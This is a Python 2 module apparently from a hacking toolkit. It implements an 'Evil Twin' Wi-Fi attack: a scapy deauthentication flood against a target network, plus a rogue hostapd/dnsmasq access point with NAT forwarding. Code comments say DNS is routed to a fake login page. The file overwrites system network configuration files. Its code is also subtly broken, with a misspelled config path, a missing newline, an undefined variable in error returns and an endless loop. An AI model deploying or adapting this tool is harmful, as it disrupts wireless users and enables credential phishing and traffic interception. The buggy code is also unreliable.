#from login_server import login_server
# -*- coding: utf-8 -*-
import os
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


class netspoof():

    def __init__(self):
        self.req_var = True
        self.opt_var = False
        self.req_variables = ["-i", "-s", "-c"]

    def help(self):
        hlp = (
            "\nDescription:\n"
            "############\n"
            "\nCommand will deauthorize a specifc network than spoof a user "
            "into reconecting with a spoofed network."
            "If you wish to exit the spoof "
            "use the control + c\n"
            "\nUsage:\n"
            "############\n"
            "\n'netspoof -s <ssid> -i <interface> -c <channel>'\n"
        )
        return hlp

    def netspoof(self, var):
        if "-s" in var and "-i" in var and "-c" in var:
            try:
                #self.start_server()
                #self.deauthnet(var["-i"], var["-s"])
                self.createAP(var["-s"], var["-i"], var["-c"])

            except Exception, e:
                return "Cannot spoof the network " + "'" + var["-s"] + "'" and e
        else:
            return "Error: Need to specifiy network to spoof" and e

    def createAP(self, ssid, iface, channel):

        # editing config file for ap settings
        ap_confile = open("/etc/hostapd/hostapd.conf", "w")
        config = (
            "ctrl_interface=/var/run/hostapd\n"
            "interface=" + iface + "\n"
            "ssid=" + ssid + "\n"
            "driver=nl80211\n"
            "ctrl_interface_group=0\n"
            "channel=" + channel + "\n"
            "hw_mode=g\n"
            "macaddr_acl=0\n"
            "wmm_enabled=0\n"
            "ignore_broadcast_ssid=0\n"
        )
        ap_confile.write(config)
        ap_confile.close()

        # editing dnqmasq.conf file
        dhcp_confile = open("/etc/dnqmasq.conf", "w")
        config = (
            "expand-hosts\n"
            "log-facility=/var/log/dnsmasq.log\n"
            "interface=" + iface + "\n"
            "dhcp-autoritative\n"
            "dhcp-option=1,255.255.255.0"
            "dhcp-option=3,192.168.1.1\n"
            "dhcp-option=6,192.168.1.1\n"
        )
        dhcp_confile.write(config)
        dhcp_confile.close()

        # editing interfaces file
        # all dns queries are routed to 10.0.0.1
        # where the fake login page is located
        inter_default = open("/etc/network/interfaces", "w")
        config = (
            "auto lo\n"
            "\niface lo inet loopback\n"
            "allow-hotplug " + iface + "\n"
            "iface " + iface + " inet static\n"
            "hostapd /etc/hostapd/hostapd.conf\n"
            "address 10.0.0.1\n"
            "netmask 255.255.255.0\n"
            "broadcast 255.0.0.0\n"
            "pre-up iptables-restore < /etc/iptables.rules\n"
        )

        inter_default.write(config)
        inter_default.close()

        # editing default hostapd file
        hostapd_default = open("/etc/default/hostapd", "w")
        config = (
            "# Defaults for hostapd initscript\n"
            "#\n"
            "# See /usr/share/doc/hostapd/README.Debian for information"
            " about alternative\n"
            "# methods of managing hostapd.\n"
            "#\n"
            "# Uncomment and set DAEMON_CONF to the absolute path of"
            " a hostapd configuration\n"
            "# file and hostapd will be started during system boot."
            " An example configuration\n"
            "# file can be found at "
            "/usr/share/doc/hostapd/examples/hostapd.conf.gz\n"
            "#\n"
            "DAEMON_CONF=/etc/hostapd/hostapd.conf\n"

            "# Additional daemon options to be appended to hostapd command:-\n"
            "#       -d   show more debug messages (-dd for even more)\n"
            "#       -K   include key data in debug messages\n"
            "#       -t   include timestamps in some debug messages\n"
            "#\n"
            "# Note that -B (daemon mode) and -P (pidfile) "
            "options are automatically\n"
            "# configured by the init.d script and must not "
            "be added to DAEMON_OPTS.\n"
            "#\n"
            "#DAEMON_OPTS=""\n"
        )

        hostapd_default.write(config)
        hostapd_default.close()
        
        # set ip table rules
        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
        os.system("sudo iptables -P FORWARD ACCEPT")
        os.system("sudo iptables --table nat -A POSTROUTING -o enp0s31f6 -j MASQUERADE")

        # start start AP and dhcp
        os.system("sudo rfkill unblock all")
        os.system("/etc/init.d/dnsmasq restart")
        os.system("sudo hostapd /etc/hostapd/hostapd.conf")
        print("Started Evil Twin AP..")

    def deauthnet(self, iface, bssid):

        # make sure device is in monitor mode
        os.system("sudo ifconfig " + iface + " down")
        os.system("sudo iwconfig " + iface + " mode monitor")
        os.system("sudo ifconfig " + iface + " up")

        # creating deauth packet to send
        packet = (
            RadioTap() /
            Dot11(
                type=0, addr1="ff:ff:ff:ff:ff:ff",
                addr2=bssid,
                addr3=bssid) / Dot11Deauth()
        )
        while self.deauthnet:
            for n in range(0, 64):
                sendp(packet, iface=iface)
                sendp(packet, iface=iface)

    def stopAP(self):
        os.system("service hostapd stop")
        os.system("service udhcpd stop")

    def start_server(self):
        instance = login_server()

    def checklibs():
        return
        # checks if udhcpd and hostapd are both installed
